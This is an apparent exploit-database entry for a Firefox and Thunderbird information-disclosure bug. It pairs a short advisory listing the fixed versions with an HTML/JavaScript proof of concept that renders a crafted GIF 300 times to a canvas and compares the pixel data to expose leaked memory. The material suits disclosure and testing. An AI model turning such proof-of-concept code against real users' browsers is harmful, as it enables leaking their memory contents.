source: http://www.securityfocus.com/bid/69525/info

Mozilla Firefox and Thunderbird are prone to an information-disclosure vulnerability.

Attackers can exploit this issue to disclose sensitive information that may aid in further attacks.

This issue is fixed in:

Firefox 32
Firefox ESR 31.1
Thunderbird 31.1 

<style>
body {
  background-color: #d0d0d0;
}

img {
  border: 1px solid teal;
  margin: 1ex;
}

canvas {
  border: 1px solid crimson;
  margin: 1ex;
}
</style>

<body onload="set_images()">

<div id="status">
</div>

<div id="image_div">
</div>

<canvas height=32 width=32 id=cvs>
</canvas>

<h2>Variants:</h2>

<ul id="output">
</ul>

<script>
var c = document.getElementById('cvs');
var ctx = c.getContext('2d');

var loaded = 0;
var image_obj = [];
var USE_IMAGES = 300;

function check_results() {

  var uniques = [];

  uniques.push(image_obj[0].imgdata);

  document.getElementById('output').innerHTML += 
    '<img src="' + image_obj[0].imgdata + '">';

  for (var i = 1; i < USE_IMAGES; i++) {

    if (image_obj[0].imgdata != image_obj[i].imgdata) {

      for (var j = 1; j < uniques.length; j++)
        if (uniques[j] == image_obj[i].imgdata) break;

      if (j == uniques.length) {

        uniques.push(image_obj[i].imgdata);

        document.getElementById('output').innerHTML += 
          '<img src="' + image_obj[i].imgdata + '">';


      }


    }

  }

  if (uniques.length > 1)
    alert('The image has ' + uniques.length + ' variants when rendered. Looks like you have a problem.');
  else
    alert('The image has just one variant when rendered. You\'re probably OK.');

}


function count_image() {

  loaded++;

  ctx.clearRect(0, 0, 32, 32);

  try {
    ctx.drawImage(this, 0, 0, 32, 32);
  } catch (e) { }

  this.imgdata = c.toDataURL();

  if (loaded == USE_IMAGES) check_results();

}


function set_images() {

  loaded = 0;
  create_images();

  for (var i = 0; i < USE_IMAGES; i++)
    image_obj[i].src = './id:000110,src:000023.gif?' + Math.random();

}


function create_images() {

  for (var i = 0; i < USE_IMAGES; i++) {

    image_obj[i] = new Image();
    image_obj[i].height = 32;
    image_obj[i].width = 32;
    image_obj[i].onerror = count_image;
    image_obj[i].onload = count_image;

    document.getElementById('image_div').appendChild(image_obj[i]);

  }

}


</script>


<iframe src='http://www.example.com/'></iframe>
